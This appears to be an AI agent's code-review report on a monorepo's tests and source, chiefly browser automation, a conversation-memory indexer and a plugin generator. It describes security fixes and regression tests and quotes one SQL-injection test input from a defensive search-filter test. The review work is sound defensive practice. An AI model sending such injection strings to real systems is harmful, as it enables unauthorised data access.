- `packages/glass/test/array-guards.test.mjs`, `bundle-drift.test.mjs`, `bundle-loads.test.mjs`, `cli-dispatch.test.mjs` — all read and cross-checked against the source they exercise (`lib/tabs.js`'s `Array.isArray` guards, `dist/index.js` vs. the `createSession()` method surface, the CLI's `stop`/`start`/dispatch paths); the tests' own assertions match what the underlying code actually does, and `cli-dispatch.test.mjs` in particular documents and defends against a real historical test-quality regression (asserting exit status/stdout rather than only the absence of certain stderr strings).

- `packages/glass/test/lib/dialogs-router.test.mjs` — the CR-058 test
  (`'a crafted _shimId cannot inject extra JS or flip the decision'`) actually
  executes the emitted `Runtime.evaluate` expression through `node:vm` against
  a recording stub, rather than pattern-matching the string. Cross-checked
  against `dialogs-router.js`, which builds the expression via
  `JSON.stringify(id)`/`JSON.stringify(decision)`/`JSON.stringify(secret)` —
  the fix is real and the test would catch a regression to string
  interpolation.
- `packages/glass/test/lib/dialogs.test.mjs` — the CR-064 forged-permission
  test (`'ignores a forged permission-request with no (or the wrong) secret'`)
  is backed by a real per-session secret check in `dialogs.js`
  (`state._dialogShimSecrets`, compared with `data.secret !== expectedSecret`).
  Verified by reading the implementation directly.
- `packages/glass/test/lib/chrome-process.test.mjs` — the CR-057 readiness-probe
  test asserts `isPortAlive` is called with the spawned PID as its third
  argument; cross-checked against `chrome-process.js`'s three `isPortAlive(...,
  proc.pid)` call sites and `chrome-launcher-helpers.js`'s
  `isPortAlive(host, port, expectedPid = null)` signature — the assertion
  matches the real contract.
- `packages/glass/test/lib/chrome-launcher-helpers.test.mjs` — the CR-056
  sibling-profile substring test is backed by a real `path.resolve(...) !==
  path.resolve(profileDir)` exact-match guard in
  `findOrphanChromeForProfile`, not a substring test; verified by reading the
  source.
- `packages/glass/test/lib/find-pid-on-port-guard.test.mjs` — the
  command-injection regression coverage (rejected inputs, argv-only
  `execFileSync` usage, exact-suffix matching on Windows `netstat` output) was
  checked line-by-line against `findPidOnPort` in `chrome-launcher-helpers.js`;
  all of the accepted/rejected input pairs (including the `0x23fa` hex and
  `9.222e3` scientific-notation edge cases) match the guard's actual
  `Number()`/`Number.isInteger()` behavior.
- `packages/glass/test/lib/html-diff.test.mjs` — the CR-059/060 "bails out ...
  above a line-count safety cap" test exercises a real, documented DoS
  mitigation (unbounded `O(D*(N+M))` memory in Myers diff) at a size deliberately
  kept below the measured-unsafe range; the test's intent and scope are sound.
- The remaining files in this shard (`element-selector.test.mjs`,
  `evaluate-await-promise.test.mjs`, `host-lifecycle.test.mjs`, `_helpers.mjs` /
  `_helpers.test.mjs`, `browser-bridge.test.mjs`, `browser-session.test.mjs`,
  `cdp-router.test.mjs`, `chrome-ws-lib-bridge.test.mjs`,
  `cli-close-numeric.test.mjs`, `console-logging.test.mjs`, `cookies.test.mjs`,
  `dialogs-render.test.mjs`, `evaluation.test.mjs`, `extraction.test.mjs`,
  `file-upload.test.mjs`, `key-definitions.test.mjs`, `keyboard-input.test.mjs`,
  `mouse.test.mjs`, `navigation.test.mjs`,
  `page-scripts/dom-summary.test.mjs`) were read in full; their assertions
  match the fake/stub shapes they construct and the behavior they claim to
  pin, with no contract mismatches found.

- `packages/glass/test/lib/page-scripts/markdown.test.mjs`,
  `permission-shim.test.mjs`, `page-session.test.mjs`, `profile-lock.test.mjs`,
  `select-option.test.mjs`, `session-state.test.mjs`, `tabs.test.mjs`,
  `viewport.test.mjs`, `websocket-client-handshake.test.mjs`,
  `websocket-client-no-compression.test.mjs`, `screenshot.test.mjs`,
  `screenshot-exec-safety.test.mjs` — read in full; assertions match the
  documented behavior (CR-063/CR-064 permission-shim secret-binding tests,
  CR-065 screenshot containment-root tests, CR-066 websocket-handshake
  timeout/rejection tests, CWE-78 command-injection regression tests). Ran
  the full `packages/glass` unit vitest project (50 files, 533 tests, all
  passing, including every non-manual file in this shard) to confirm none of
  these are stale or already broken.
- `packages/glass/test/mcp-error-flag.test.mjs`, `mcp-postel-fixes.test.mjs`,
  `mcp-schema.test.mjs`, `payload-normalization.test.mjs`,
  `schema-collapse.test.mjs`, `session-isolation.test.mjs`, `smoke.test.mjs`,
  `popup-dialog-integration.test.mjs` — behavioral and source-text guard
  tests against `dist/index.js`/`dist/payload.js`; correctly gated behind
  Chrome-availability detection (`smoke.test.mjs`,
  `popup-dialog-integration.test.mjs`) and wired correctly into
  `vitest.config.ts`'s `CHROME_SUITES` list. Referenced fixture files
  (`test/fixtures/popup-opener.html`, `popup-with-confirm.html`) and helper
  modules (`test/lib/_helpers.mjs`, `test/dialogs.smoke.test.mjs`) exist as
  expected.
- `packages/glass/vitest.config.ts` — the two-project split (`unit` vs.
  `chrome`) correctly excludes `test/manual/**` and the three Chrome-dependent
  suites from the CI-safe `unit` project.
- `packages/jig-graph/src/moedex.ts` — `MoedexClient` degrades gracefully
  (`connect()`/`isAvailable()` never throw on an unreachable daemon),
  `disconnect()` is idempotent and safe to call when never connected, and the
  test-only `_setTransport` seam is clearly scoped and documented.

- `packages/jig/src/worktree.ts` — considered whether `worktreeCreate`'s `join(worktreeDir, branch)` lets a caller escape `.moe/worktrees/` via a `branch` argument containing `..` (asymmetric with `worktreeRemove`, which explicitly re-validates the resolved path stays under `.moe/worktrees/`). Reproduced directly: `git`'s own ref-name validation (`check-ref-format`) rejects any branch name containing `..` before `git worktree add` runs, and `path.join` does not let a leading `/` in the second argument override the base directory, so the traversal is closed by git's own validation. No working exploit found.
- `packages/memory/src/db.ts` — considered whether `ON DELETE CASCADE` on `tool_calls.exchange_id` (added by `migrateToolCallsCascade`) is actually enforced, since `initDatabase()` never explicitly runs `PRAGMA foreign_keys = ON` outside the one-time migration path. Verified with a standalone better-sqlite3 repro that the library defaults `foreign_keys` to `1` (ON) for every new connection, so cascading deletes work correctly on ordinary (already-migrated) connections without an explicit pragma call.
- `packages/memory/src/codex-hook-trust.ts` — considered whether `detectCodexHookTrustState` crashes (unhandled stream `'error'`) when `spawn("codex", ...)` fails (binary not installed/ENOENT) and the code immediately calls `child.stdin.write(...)`. Reproduced with a nonexistent binary: Node queues the write and reports failure only via the already-registered `child.on("error")` handler; no uncaught exception, and the function correctly resolves to `"unknown"` via its `try/catch`.
- `packages/jig/src/parser.ts` — `parsePlan`'s fenced-code-block skipping and `validatePlan`'s duplicate-task-number/cycle detection (Kahn's algorithm, run against `known` task numbers only) were checked against the test fixtures in `parser.test.ts` and behave correctly for the covered cases.
- `packages/jig/src/review.ts` — `reviewStamp`'s ordancestor/clean-tree checks and `commitReviewFix`'s staged-changes detection (relying on `git diff --cached --quiet`'s exit code) were traced against `review.test.ts`'s cases, including the inverted-exit-code staged-changes check, and match the documented behavior.
- `packages/jig/src/cli.ts` — the `realpathSync`-based `require.main === module` equivalent for ESM, and the `CommanderError` exit-code passthrough in `main()`, were checked against `cli.test.ts` and behave as documented (including under pnpm's symlinked bin shims, per the file's own comment).

- `packages/memory/src/file-lock.ts` — the acquire/release protocol built on `proper-lockfile`, including the diagnostic-PID-file unlink-then-recreate ordering (documented and intentional: "a subsequent acquirer will recreate it"), the `ELOCKED` vs. genuine I/O error distinction, and the stale-lock mtime threshold.
- `packages/memory/src/journal/search.ts` — `JournalSearchService.readEntry`'s two-stage containment guard (resolve → require `.md` → require containment → realpath → require containment again) correctly defends against a symlink escape, unlike `read_conversation` above.
- `packages/memory/src/journal/store.ts` — the collapsed-root scope disambiguation (`scopeFor`), the prune-only-what-I-walked logic in `indexJournal` (correctly scoped to `this.roots()` so one project's index run cannot delete another project's rows), and the asymmetric `journalEntryId` key construction in `journal/markdown.ts`.
- `packages/memory/src/embeddings.ts` and `embedding-migration.ts` — the memoized init promise with retry-on-failure, the `EMBEDDING_VERSION` bump discipline, and the lock-protected, batch-transactional re-embed flow (`runMigrationBatch`/`recordReembedded`) all hold together correctly, including the query/passage BGE prefix asymmetry being applied consistently for both conversation and journal search.
- `packages/memory/src/parser.ts` — the Claude vs. Codex harness detection and the two exchange-builder state machines, including the tool-call/tool-result association via `toolCallsByCallId` and its clearing on `finalizeExchange`, which I traced to confirm the `currentExchange!` non-null assertion in `appendToolResult` cannot actually fire on a stale/cleared exchange.
- `packages/memory/src/mcp-server.ts` — the overall request-handling pattern of catching all errors and returning them as tool-result content with `isError: true` rather than as transport-level failures, matching MCP's own recommendation as the file's comment describes.
- `packages/memory/src/summary-sentinel.ts` — the three-way sentinel state machine (missing / empty permanent / `__ERRORED__` retryable-after-threshold) is internally consistent; the gap identified above is that `summarizer.ts` can produce content that is byte-for-byte indistinguishable from the "empty permanent" state without actually being trivial.

- `packages/memory/src/version.ts` — pinned constant; consistent with its own doc comment and the
  package's checked-in build model (no npm lifecycle generator under turbo/tsc -b).
- `packages/memory/test/codex-support.test.ts` against `src/codex-support.ts` —
  `parseCodexCliVersion`, `compareSemver`, `versionMeetsMinimum`, and `MIN_CODEX_VERSION` all match
  the test's assertions exactly, including the `0`-fallback behavior for missing version segments.
- `packages/memory/test/codex-doctor.test.ts` and `codex-e2e-script.test.ts` /
  `claude-e2e-script.test.ts` against `src/doctor.ts`, `src/codex-hook-trust.ts`, and
  `hooks/hooks.json` — the hook-trust message text, the `/hooks` guidance branch, and the
  `SessionStart` command string (`if [ -n "${PLUGIN_ROOT:-}" ]; then exit 0; fi; node
  "${CLAUDE_PLUGIN_ROOT}/dist/cli.js" sync --background`) all match what the tests assert
  byte-for-byte.
- `packages/memory/test/codex-plugin.test.ts` against `.mcp.json` and `src/paths.ts` — the
  `env_vars` allowlist contains every `MOE_*` token actually referenced in `paths.ts` (verified by
  grepping all `MOE_[A-Z0-9_]*` occurrences against the allowlist), and the four hand-maintained
  manifests it asserts are absent are in fact absent from the package root.
- `packages/memory/test/cosine-similarity.test.ts` against `src/search.ts`'s
  `l2DistanceToCosineSimilarity` — the implementation (`1 - d*d/2`, clamped to `[-1, 1]`) matches
  every asserted value, including the sub-1 clamp for `distance = 2.0000001`.
- `packages/memory/test/embedding-init.test.ts` and `embedding-migration.test.ts` — the
  model-load timeout/memoization contract and the 2000-char truncation constant
  (`MAX_INPUT_CHARS` in `src/embeddings.ts`) match; the migration lock/stale-batch/re-embed
  behaviors line up with `src/embedding-migration.ts`.
- `packages/memory/test/do-not-index-indexer.test.ts` (CR-070) and
  `exclude-codex-project.test.ts` (CR-069) — verified against `src/indexer.ts` and `src/sync.ts`
  that all three indexer entry points (`indexConversations`, `indexSession`, `indexUnprocessed`)
  call `shouldSkipConversation`, and that project-exclusion filtering is re-checked against each
  exchange's resolved `project` field (`excludeByResolvedProject`) rather than only the walk's
  top-level directory name — both fixes are real and match their tests.
- `packages/memory/test/exclusion-markers.test.ts` — `EXCLUSION_MARKER`, `LEGACY_EXCLUSION_MARKER`,
  and `EXCLUSION_MARKERS` string literals match `src/sync.ts` exactly.
- `packages/memory/test/journal-cli-args.test.ts` against `src/journal-cli.ts`'s
  `parseJournalArgs` — the value-flag consumption logic (including the "flag at end of args, or
  followed by another flag, consumes nothing" guard) matches every asserted case.
- `packages/memory/test/journal-project-isolation.test.ts` — `journalEntryId`'s root-in-key-only-
  for-project-scope behavior in `src/journal/markdown.ts` matches the isolation guarantees the
  test suite exercises.
- `packages/memory/test/graph.test.ts`'s "link_memories MCP handler parsing" — the replicated
  `indexOf(":")`/`slice` logic matches the real handler in `src/mcp-server.ts` verbatim, so the
  test is not silently exercising dead logic.
- `packages/memory/test/install-check.test.ts` against `src/install-check.ts` and `package.json`
  — `REQUIRED_PACKAGES` is exactly the package's declared `dependencies` list, and excludes the
  transitive/optional packages (`onnxruntime-node`, `sharp`, `fsevents`) the test says must not be
  probed directly.
- `packages/memory/test/manual/codex-e2e.d.ts` — a minimal ambient declaration for the one export
  `codex-e2e-cleanup.test.ts` imports; matches `withTempRoot`'s real signature in
  `test/manual/codex-e2e.js`.
- `packages/memory/test/db.test.ts`, `journal-search.test.ts`, `journal-store.test.ts`,
  `journal-markdown.test.ts`, `logging.test.ts`, `hooks.test.ts`, `cross-harness-recall.test.ts`,
  `codex-transcripts.test.ts`, `codex-skills.test.ts`, `file-lock.test.ts`,
  `exclude-nested.test.ts` — read in full; assertions are internally consistent with the behavior
  they describe and no contract mismatch or unreachable/vacuous assertion was found.

- `packages/memory/test/manual/codex-e2e.js` — manual, opt-in-only E2E harness (`MOE_MEMORY_RUN_CODEX_E2E=1` gate). Verified `withTempRoot` releases the temp directory containing the copied live Codex `auth.json` on both the success and thrown-error paths via `try/finally` (this is the documented CR-077 fix). `shellQuote` uses the standard `'...'` + `'\''` escaping for values interpolated into the `tmux new-session` command string, which is correct for the fixed, non-attacker-controlled inputs used here (constant `MARKER`, generated temp paths). `isMain` guard correctly prevents `main()` from firing when the file is imported by a unit test for `withTempRoot`.
- `packages/memory/test/model/embedding-migration-encoder.test.ts`, `journal-encoder.test.ts` — real-encoder round-trip tests (batch resumability, embedding version stamping, unit-norm invariant); env vars are set/cleared symmetrically in `beforeEach`/`afterEach` and temp dirs are removed.
- `packages/memory/test/model/exclude-nested-indexer.test.ts`, `incremental-indexing.test.ts`, `sync-indexing.test.ts` — env fixtures are isolated per test via unique temp dirs and cleaned up in `afterEach`; assertions match the described behavior (nested exclude, append-then-reindex, both DO-NOT-INDEX marker forms).
- `packages/memory/test/model/integration.test.ts` — full-pipeline indexing/search coverage against real fixtures across vector/text/combined/date-filtered modes; consistent path scoping with per-test `MOE_MEMORY_DB_PATH` and cleanup.
- `packages/memory/test/model/multi-concept.test.ts` — correctly rewritten to use a temp DB rather than the real production index (its own comment documents the prior vacuous-pass bug); the "returns nothing when only one concept present" test title is slightly imprecise but the body's comment explicitly documents that it asserts intersection semantics rather than emptiness, so this is self-documented and not a hidden gap.
- `packages/memory/test/model/search-metadata-filters.test.ts` — filter coverage (project/session/branch/commit, AND-combination) plus an explicit SQL-injection-via-string-interpolation regression test (`project: "project-a' OR '1'='1"` expecting no results), which is good defensive coverage.
- `packages/memory/test/model/verify-repair.test.ts` — repair round-trip for orphaned and outdated entries; confirmed `{ noSummaries: true }` avoids requiring live Claude auth, matching the file's own explanatory comment.
- `packages/memory/test/parser.test.ts` — aside from the flagged vacuous case, coverage of metadata extraction, large-file parsing performance, and data-integrity invariants across all exchanges is solid.
- `packages/memory/test/paths.test.ts` — thorough env-var save/restore in `beforeEach`/`afterEach` (including `vi.restoreAllMocks()`), covering the three jest-era bugs the file's comment documents were fixed on port; journal-root resolution/override/de-dup logic all checked against expected paths.
- `packages/memory/test/query-prefix.test.ts` — trivial but correct prefix/idempotency checks.
- `packages/memory/test/repair-do-not-index.test.ts` — verifies `repairIndex` refuses to summarize/index a DO-NOT-INDEX-marked conversation reached via `issues.missing` from a source other than `verifyIndex`, with the transformers pipeline and summarizer properly mocked.
- `packages/memory/test/search-agent-template.test.ts` — static assertions against the shipped prompt template; all `toContain` checks correspond to real strings a reader can spot-check in `prompts/search-agent.md`.
- `packages/memory/test/search-date-filter-vector.test.ts`, `search-text-only-confidence.test.ts` — well-targeted regression tests for the described KNN-before-WHERE and text-only-scored-as-100%-match bugs (CR-074, CR-073); vectors are constructed deliberately orthogonal/near to force the KNN edge case, and mocks are reset per test.
- `packages/memory/test/show.test.ts` — aside from the flagged vacuous case, good coverage of markdown/HTML formatting for both Claude and Codex transcript shapes, including an explicit HTML-escaping regression test for injected `<script>` content in user/tool/assistant fields.
- `packages/memory/test/stats.test.ts`, `sync-session-id.test.ts` — straightforward, assertions match setup.
- `packages/memory/test/summarizer-options.test.ts`, `summarizer-resume-fallback.test.ts` — resume-fallback retry logic (fresh-session retry only on `error_during_execution`, not on other error subtypes or non-SDK errors), cwd-existence gating, and a fake Codex `app-server` JSON-RPC harness are all consistent with the assertions made; version-floor rejection test checked against the same `0.130.0` floor used in `codex-e2e.js`.
- `packages/memory/test/sync-cli-reentrancy.test.ts`, `sync-cli-single-instance.test.ts` — spawn the real built CLI; lock-stealing-from-dead-PID and lock-release-on-exit cases are meaningful regression tests, not just happy-path. (Noted, not filed: `runWith`/`spawnWith` set `MOE_MEMORY_SUMMARIZER_GUARD: undefined` in the child env, which Node stringifies to the literal `"undefined"` rather than unsetting the var — confirmed with `node -e` — but since `shouldSkipReentrantSync` checks strict equality against `"1"`, this has no effect on test behavior.)
- `packages/memory/test/sync-error-sentinel.test.ts`, `sync.test.ts` — error-sentinel retry-window behavior (including a custom `MOE_MEMORY_SUMMARY_ERROR_RETRY_HOURS`) and zero-exchange sentinel non-requeueing are both tested with real time manipulation (`utimesSync`) rather than mocked clocks, which is a more convincing test than a fake-timer equivalent.
- `packages/memory/test/test-indexer.ts`, `test-utils.ts` — `fakeEmbed`'s deterministic hashed-bag-of-words embedding is correctly unit-normalized (required by the L2-to-cosine conversion elsewhere), and its own comment contrasts it usefully against an upstream mocking anti-pattern (same vector for every input) that would have made semantic-ranking assertions pass vacuously.
- `packages/memory/test/tool-calls-cascade.test.ts` — covers cascade delete on a fresh schema and, importantly, migration of a legacy pre-cascade schema with an existing FK-violating orphan row, asserting the orphan is dropped and the valid row survives.
- `packages/memory/test/verify.test.ts` — missing/orphaned/outdated detection, exclusion filtering, error-sentinel-as-missing, and DO-NOT-INDEX-as-not-missing are all covered with fixtures that match the production code paths described in the comments.

- `packages/mint/src/adapters/claude-code.ts`, `codex.ts`, `kimi.ts`, `cursor.ts`, `opencode.ts`, `pi.ts`, `copilot.ts`, `index.ts`, `shared.ts`, `types.ts` — manifest field emission, install-doc generation, capability/limitation bookkeeping, and bootstrap hook wiring all read correctly against `deriveEmittedCapabilities` in `platform/capabilities.ts` and the adapters' own test suites. Cursor's `manifest.commands`/`manifest.agents` pointing at source paths while simultaneously reporting `COMPONENT_OMITTED` for the same components looked contradictory at first read, but it is deliberate, documented, and covered by an explicit assertion in `test/adapters/cursor.test.ts` ("warns about user hooks, commands, agents, and mcp not being translated/emitted").
- `packages/mint/src/adapters/maka.ts`, `openclaude.ts` — both are explicitly documented, unregistered skeleton adapters (confirmed absent from `adapters/index.ts`'s `adapters` array); their placeholder `emit()`/`installDoc()` behavior matches their own header comments.
- `packages/mint/src/artifact/artifact-manifest.ts`, `pack.ts`, `payload.ts`, `assemble.ts`, `paths.ts` — extensive TOCTOU-aware file handling (stat-before/open/stat-after identity checks via dev/ino/mtime/ctime, `O_NOFOLLOW`, hard-link rejection, symlink rejection), NFC/case-fold collision detection, and a hand-rolled but spec-correct USTAR tar parser (checksum verification, bounded gzip expansion, path-escape rejection, member-count/size limits, directory/file shape-conflict detection). No gaps found in the traversal or extraction logic.
- `packages/mint/src/artifact/legal.ts`, `license-payload.ts` — verified `LEGAL_TEMPLATE_SHA256`'s two pinned digests against the actual `LICENSE-BSD-3-CLAUSE` and `LICENSE-ISC` files in the repo root (`shasum -a 256`); both match exactly.
- `packages/mint/src/artifact/bundle-inventory.ts`, `references.ts`, `check.ts` — path-containment checks (`containedRelative`), esbuild-metafile parsing, and cross-manifest reference validation are consistent; `checkArtifactSet`'s per-plugin try/catch correctly routes packing failures to the shared `problems` list rather than reaching the later `results.push` with a stale `packed` reference.
- `packages/memory/test/version-consistency.test.ts`, `packages/memory/vitest.config.ts` — both match their documented intent (guarding `VERSION` drift and splitting the model-dependent suite from the CI-safe one) with no logic issues.
- `packages/mint/fixtures/universal-artifact/**` — plain, self-consistent fixture files with no logic to break.

- `packages/mint/src/generate.ts`'s `RESERVED_PACKAGE_JSON_FULL_CASE_FOLD` /
  `isReservedRootPackagePath` (the guard that stops an adapter from emitting
  a root `package.json` under a different case, e.g. `Package.JSON`, which
  would collide on case-insensitive filesystems): its comment claims the
  table is the *complete* set of Unicode 16.0.0 case-fold scalars whose
  folded value is a substring of `"package.json"`. Cross-checked this against
  the canonical case-fold data in `packages/mint/src/artifact/unicode-casefold.ts`
  with `grep -nE "^\s*\[0x[0-9A-Fa-f]+, '[acegjknops]'\]"` — the only matches
  are exactly the ASCII uppercase letters A/C/E/G/J/K/N/O/P/S plus U+017F
  (long s) and U+212A (Kelvin sign), matching the hardcoded table entry for
  entry. No multi-character fold value (e.g. ligatures) matches any 2+
  character substring of `"package.json"` either (checked several candidate
  substrings against the data file). The guard is correct and consistent
  with the shipped Unicode data as of this snapshot.
- `packages/mint/src/fileset.ts`'s `writeFileSet`/`assertNoSymlinkInPath`:
  correctly closes the containment-check TOCTOU window by opening with
  `O_NOFOLLOW` for the actual write, in contrast to the projections.ts finding
  above.
- `packages/mint/src/config.ts`'s schema and migration-error paths
  (`rejectLegacySyntax`, `resolveHarnessSettings`, `resolveTargets`,
  `validateTargetMigration`, `normalizeImportedWorks`): traced each rule
  against `loadConfig`'s call order and found the migration/validation
  ordering consistent (legacy syntax rejected before schema parse, harness
  settings validated against the frozen `ADAPTER_NAMES`/`TARGET_IDS` list,
  imported-work root overlap detection symmetric in both directions).
- `packages/mint/src/artifact/staged-imports.ts`'s `classifyStagedImports`:
  overlap detection (`within`), undeclared-work rejection, and the
  root-must-be-staged closure check all handle the `bundle` sourceKind
  carve-out consistently.
- `packages/mint/src/package-manifest.ts`'s `composePackageManifest` /
  `mergeAdapterPackageContributions` / `validateManifestReferences`: the
  field allowlists (`DESCRIPTIVE_FIELDS`/`OMITTED_FIELDS`/`RUNTIME_FIELDS`),
  the `pi`/`opencode` namespace ownership checks, and the workspace-protocol
  version substitution (`workspace:*` / `workspace:^` / `workspace:~`) were
  traced end to end and are internally consistent and strict-by-default
  (unclassified fields throw rather than pass through silently).

- `packages/mint/src/release/npm-registry.ts` — `inspectVersion`'s fallback to `{ state: 'absent' }` when
  `result.stdout.includes('E404')` relies on `npm view <pkg>@<version> --json` writing the `E404` error
  object to **stdout** (not just stderr) on a 404. I verified this directly: `npm view
  this-package-definitely-does-not-exist-zzz123456@1.0.0 --json` in the scratchpad writes
  `{"error":{"code":"E404",...}}` to stdout and the human-readable `npm error 404 ...` text to stderr.
  `buildNpmCommandRunner` discards stderr but captures stdout, so the code's assumption holds against a
  real npm invocation, and the subsequent `JSON.parse(...).error` check is a correct second line of
  defense if the string match text ever changes.
- `packages/mint/src/vocabulary.ts` — the token/block/resource substitution pipeline (fence-tracking via
  `advanceMarkdownFence`, escape handling, `assertNoSurvivors`/`assertNoResourceSurvivors`, and
  `planSkillRendering`'s in-place vs. rendered output-dir bucketing with cross-adapter profile/mode
  collision detection) is internally consistent and exercised thoroughly by
  `test/core-semantics.test.ts` and the per-adapter test files in this shard (vocabulary token
  substitution across all eight profiles, escaped-literal round-tripping, resource-link rewriting with
  percent-encoding of parentheses).
- `packages/mint/src/validate.ts` and `packages/mint/src/test-command.ts` — schema selection, exit-code
  mapping for the container-backed check runner (`0`→0, `3`→2, anything else/`ENOENT`→`ConfigError`), and
  the deliberate exclusion of the Codex manifest from schema validation (documented and covered instead
  by exact-content tests) are all correct as written.
- The adapter test suites (`claude-code`, `cursor`, `codex`, `kimi`, `opencode`, `pi`, `agent-plugins`,
  `copilot`, plus `skills-output-dir.test.ts` and `registry.test.ts`) give exact-content assertions for
  every emitted manifest, hook script, and install doc, including negative/edge cases (per-harness
  `hooks: own`, `bootstrap: none`/`generate`, non-default component paths, malformed MCP config, name-gate
  rejection, Unicode case-folding). Two of the Pi tests (`type-checks the emitted skill-mode extension
  under strict NodeNext`, and its `bootstrap: none` twin) actually shell out to `tsc` against a typed stub
  of `@earendil-works/pi-coding-agent` and assert a deliberately-broken variant fails to compile — real
  proof the generated TypeScript type-checks, not string matching.
- `test/artifact-manifest.test.ts`, `test/artifact-check.test.ts`, `test/artifact-references.test.ts`,
  `test/assemble-artifact.test.ts`, and `test/bundle-inventory.test.ts` — the artifact-safety test suites
  are unusually rigorous: TOCTOU re-open races, symlink/hardlink/FIFO/socket/device rejection, Unicode
  NFC and full case-fold collision detection, reserved-path aliasing (`.MOE`, `.MOE-BUILD`,
  `PACKAGE.JSON` case-folded), and canonical-tree-untouched-on-failure guarantees are all exercised
  against real filesystem operations rather than mocked.
- `test/config.test.ts`, `test/bump.test.ts`, and `test/cli.test.ts` — config schema closure (unknown-key
  rejection at every nesting level), the migration-required diagnostics for pre-v2 syntax, and the CLI's
  end-to-end generate/validate/bump/init flows (including the root `mint`/`mint:check` recovery-journal
  state machine across all six documented journal states) match their respective implementations. The
  hardcoded plugin versions asserted in the `publish-matrix` CLI test were cross-checked against the six
  packages' actual `package.json` versions and are currently accurate.

Read all 30 assigned files (test suites, test helpers/fakes, and fixture source files under
`packages/mint/test/`). Summary of what was specifically checked:

- `packages/mint/test/dogfood.test.ts` — verified the `findReferenceSnapshot()` walk-up logic
  actually reaches `Code/.moe-references/superpowers` (the location recorded in the user's
  own memory notes) by tracing the loop's `join(dir, '..', '.moe-references', 'superpowers')`
  candidate at each ancestor of the test file's directory; the loop terminates correctly via
  `dirname(dir) === dir` at the filesystem root and falls back to the historical fixed path.
  The `EXPECTED_DIFFERENCES` closure logic (`withExpectedDifferencesRemoved`) only deletes
  keys explicitly registered per file, so an undocumented divergence still fails the
  comparison — matches the stated acceptance-test intent.
- `packages/mint/test/field-edit.test.ts` — round-trip, dotted-path, YAML-comment-preservation,
  and every listed `ConfigError` path (missing field, unsupported extension, non-string value,
  unreadable file, malformed JSON/YAML, auto-vivification refusal, out-of-bounds array index)
  are each asserted with a distinct fixture; no assertion is vacuous or duplicated.
- `packages/mint/test/generate.test.ts` — spot-checked the symlink-related regression tests
  (`CR-080`) against their stated defect (dangling-symlink-looks-absent via `existsSync`
  following symlinks) and confirmed the assertions actually exercise both the dangling-symlink
  and the force-mode victim-file cases distinctly. Collision, pruning, stale-file, corrupt-manifest,
  and unsafe-manifest-entry tests all set up the exact precondition their assertion depends on.
- `packages/mint/test/helpers.ts` and `helpers.test.ts` — `withV1Policy` correctly threads
  `harnesses.exclude` into per-target `intent: omit` while leaving the rest of `config.harnesses`
  (e.g. adapter-specific `manifest`/`hooks` overrides) untouched, and validates malformed input
  shapes (`harnesses` not a mapping, `exclude` not a string array) before use.
- `packages/mint/test/import.test.ts` and `init.test.ts` — CLI-level (`spawnSync` against the
  built `dist/cli.js`) and unit-level tests agree on exit codes and messages; cleanup-on-failure
  tests (`cleans up an inline-extracted .mcp.json when loadConfig fails...`) assert both the
  absence of the partially written config and the absence of side-effect files.
- `packages/mint/test/legal-reconciliation.test.ts`, `license-payload.test.ts` — the
  `it.each` mutation table for `reconcileLegalClosure` covers each diagnostic code with a
  single, targeted mutation of the shared `base()` fixture, so each row's specified defect is
  what actually triggers its expected code.
- `packages/mint/test/manifest.test.ts` — `deepMerge`'s null-as-delete-sentinel semantics
  (including the "arrays are opaque to the sentinel" case) are each independently tested;
  drift detection tests cover hand-edits, deletions, exec-bit changes, and the `checkExecBit:
  false` opt-out.
- `packages/mint/test/pack-artifact.test.ts` — manually verified the hand-rolled `tarMember`/
  `tarNumber` helpers against the USTAR header layout (name 0–99, mode 100–107, size 124–135,
  checksum 148–155 computed with the checksum field space-filled, typeflag at 156, magic at
  257) and confirmed the "member-size limit" test's injected size value is well within the
  12-byte octal field's range, so it exercises the intended limit rather than a corrupted
  header from truncation.
- `packages/mint/test/mint-plugins-wrapper.test.ts` — traced the "plugin six fails" test to
  confirm it asserts a same-name unrelated staging directory (`plugins.next-unrelated`)
  survives cleanup, i.e. the transaction's rollback path is scoped to its own nonce rather
  than sweeping any `plugins.next-*` sibling.
- `packages/mint/test/package-manifest-loader.test.ts` and its `fixtures/package-consumer/`
  companions (`consumer.mjs`, `.pi/extensions/package-consumer.ts`) — the consumer script's
  imports (`@bubstack/package-consumer` root and `/server` subpath) match the `exports` map
  built into the test's `composePackageManifest` call.
- Fixture one-liners under `fixtures/bundle-metafiles/` and `fixtures/composed-plugin/` are
  inert marker modules (each exports a single boolean, or — for `test-unlinked.js` —
  deliberately throws to prove a "developer harness must not ship" fixture is unreachable);
  none contain logic that could itself be defective.
- Grepped the full shard for stray `console.log`/`debugger`/`FIXME`/`XXX` markers; the only
  hits are an intentional skip-notice log in `dogfood.test.ts` and intentional
  failure-diagnostic `console.error` calls in `init.test.ts`'s CLI `--dir` test, plus two
  literal `"TODO describe this plugin"` string assertions (the default description text under
  test, not an actual pending-work marker).

Read all 30 assigned files in full (`packages/mint/test/*.test.ts` covering package-manifest, payload staging/collision/case-folding, platform capabilities/projections/resolution/schema, provenance, public-registry, publish-matrix provenance/immutability, release assets/candidate/catalog/claude-maintenance/evidence/github-store/npm-registry/promotion/recovery/tag-policy/workflows, smoke, staged-imports, test-command, the generation-transaction crash/recovery suite, universal-artifact, validate, and vocabulary; `packages/mint/vitest.config.ts`; and `packages/statusline/src/hooks/ensure-statusline.ts` with its test).

- `packages/statusline/src/hooks/ensure-statusline.ts` — traced the full control flow: `readSettings` correctly distinguishes "absent" (`{}`), "unreadable/corrupt" (`null`), and "present" states; `ensureStatusLine` never overwrites an already-set `statusLine` key (including an explicit `null`, which the code and its tests both treat as "user disabled it, leave alone"); `defaultSettingsPath` honors `CLAUDE_CONFIG_DIR`; `readStdin`'s 5s timeout prevents the hook hanging when Claude Code's SessionStart payload is piped but unread; and `main()`'s `require.main === module` guard correctly prevents the CLI entry point from firing under vitest's ESM import. Cross-checked against `packages/statusline/hooks/hooks.json`, whose bash wrapper (not this file) performs the `PLUGIN_ROOT` check that gives Codex-style hosts a silent no-op — the test file's "silent no-op under Codex plugin-root semantics" name is accurate once this split is understood.
- `packages/mint/test/transaction.test.ts` — the durable-swap/recovery fault-injection matrix (crash after every one of 21 forward-durability events, restart-then-recover, and 15/6-cut recovery-durability fault injection for old/new rollback paths) is internally consistent: every terminal assertion confirms exactly one of `current`/`next`/`backup` survives per target and the journal is removed only when recovery is unambiguous. The `.gitignore` sibling-name check at the end (`git check-ignore` against the exact nonce temp-file patterns) passes against the current `.gitignore`.
